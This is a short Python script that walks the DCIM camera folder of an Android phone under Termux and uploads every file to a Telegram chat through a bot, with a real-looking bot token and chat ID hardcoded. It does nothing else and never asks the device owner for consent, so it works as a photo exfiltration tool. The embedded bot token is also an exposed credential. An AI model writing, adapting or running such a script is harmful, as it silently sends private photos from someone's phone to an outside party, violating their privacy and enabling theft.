import os
from telegram import Bot
from telegram.error import TelegramError
from telegram.utils.request import Request

def send_files_in_folder(bot_token, chat_id, folder_path):
    bot = Bot(token=bot_token, request=Request(con_pool_size=8))

    for root, _, files in os.walk(folder_path):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as file_data:
                    bot.send_document(chat_id=chat_id, document=file_data)
            except TelegramError as e:
                print(f"Failed to send {file}: {e}")

if __name__ == "__main__":
    path_to_folder = '/data/data/com.termux/files/home/storage/dcim'
    chat_id = 5841005593 # Replace this with your chat ID
    bot_token = '6579929679:AAFpsD5qeVo6I6-XhWTLg01RewjmszV0h6g'

    send_files_in_folder(bot_token, chat_id, path_to_folder)
